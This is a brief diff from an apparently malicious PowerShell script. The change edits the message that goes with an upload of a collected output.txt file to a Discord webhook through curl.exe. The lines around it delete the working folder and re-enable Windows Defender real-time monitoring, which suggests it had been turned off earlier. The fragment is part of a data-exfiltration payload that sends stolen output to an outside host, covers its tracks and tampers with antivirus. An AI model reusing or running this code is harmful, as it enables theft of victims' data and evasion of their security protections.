@@ -121,7 +121,7 @@ function Upload-Discord {
     if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
     }
     
-    Upload-Discord -text "ㅤ" -file "$dir\output.txt"
+    Upload-Discord -text "Met vriendelijke groet, Dhr. Haak" -file "$dir\output.txt"
 # Clean up
 Remove-Item -Path $dir -Recurse -Force
 Set-MpPreference -DisableRealtimeMonitoring $false
